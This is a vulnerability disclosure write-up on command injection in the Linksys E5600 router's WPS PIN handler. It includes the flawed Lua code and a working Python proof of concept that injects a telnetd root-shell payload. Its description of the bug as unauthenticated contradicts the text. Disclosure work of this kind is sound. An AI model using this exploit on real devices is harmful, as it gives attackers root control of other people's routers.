---
title: "E5600 Router WPS PIN Command Injection"
date: 2021-01-01
description: "Command injection vulnerability in E5600 router's WPS PIN handling — unauthenticated RCE via crafted WPS PIN parameter"
tags: ["IoT", "router", "command-injection", "WPS", "embedded", "RCE"]
categories: ["Research"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## Target

**Linksys E5600 Router**

| Firmware Version | Affected |
|---|---|
| 1.1.0.26 | Yes |

## Bug Type

Command Injection / Remote Code Execution

## Abstract

A command injection vulnerability exists in the Linksys E5600 router's WPS PIN registration handler. When a device PIN is submitted through the router's web interface under **Configure → Wi-Fi → Wi-Fi Protected Config**, the `PinCode` parameter is passed directly to `os.execute()` without sanitization, allowing an authenticated attacker to inject arbitrary shell commands.

## Root Cause

The vulnerability is in `squashfs-root/usr/share/lua/runtime.lua` at line 491:

```lua
function runtime.wpsProcess(pt)
    local ret = '"OK"'

    print("wpsProcess")

    if pt["Mode"] == 'PBC' then
        os.execute("wps_action.sh PBC &")

    elseif pt["Mode"] == 'PIN' and pt["PinCode"] ~= nil then

[1]     cmd = 'wps_action.sh PIN '..pt["PinCode"]..' &'
[2]     os.execute(cmd)

    elseif pt["Mode"] == 'STOP' then
        print("wpsProcess STOP")

        cmd = 'ps | grep wps_action.sh | grep -v grep | awk \'{print $1}\' | xargs kill'
        os.execute(cmd)

    else
        print("wpsProcess Fail")
    end

    return ret
end
```

At `[1]`, `pt["PinCode"]` is concatenated directly into the shell command string without any validation or escaping. At `[2]`, the resulting string is passed to `os.execute()`, which invokes a system shell. An attacker who controls `PinCode` can break out of the intended command context using shell metacharacters such as backticks or `$()`.

## Reproduction

```python
import requests
import json

# Step 1: Authenticate and obtain session cookie
url1 = 'http://192.168.1.1/cgi-bin/login.cgi'
data1 = {
    "username": "YWRtaW4%3D",
    "password": "YWRtaW4%3D",
    "token": "",
    "source": "web",
    "cn": "",
    "action": "auth"
}
response1 = requests.post(url1, data=json.dumps(data1))

# Step 2: Inject command via WPS PIN parameter
url2 = 'http://192.168.1.1/API/info'
headers2 = {
    'Host': '192.168.1.1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Origin': 'http://192.168.1.1',
    'Referer': 'http://192.168.1.1/idp/idp_ping.html',
    'Cookie': response1.headers['Set-Cookie'].split(" ")[0],
}
data2 = {
    "wpsProcess": {
        "Mode": "PIN",
        "PinCode": "38316173`/usr/sbin/telnetd -l /bin/sh`"
    }
}
response2 = requests.post(url2, headers=headers2, data=json.dumps(data2))
print(response2.text)
```

The injected payload `` `/ usr/sbin/telnetd -l /bin/sh` `` causes the router to spawn a telnet daemon bound to `/bin/sh`, providing an unauthenticated root shell on the device after the initial authentication step.

The resulting command executed on the device:

```bash
wps_action.sh PIN 38316173`/usr/sbin/telnetd -l /bin/sh` &
```

The shell interprets the backtick-enclosed substring as a command substitution, executing `/usr/sbin/telnetd -l /bin/sh` before `wps_action.sh` runs.

## Impact

Successful exploitation provides root-level code execution on the router. An attacker with access to the router's admin interface (local network or exposed management port) can:

- Spawn persistent backdoor shells (`telnetd`, `dropbear`)
- Modify routing tables, DNS settings, or firewall rules
- Intercept or redirect network traffic passing through the device
- Use the device as a pivot point into the local network

## Discoverer

CoreSecurity OT Research Team
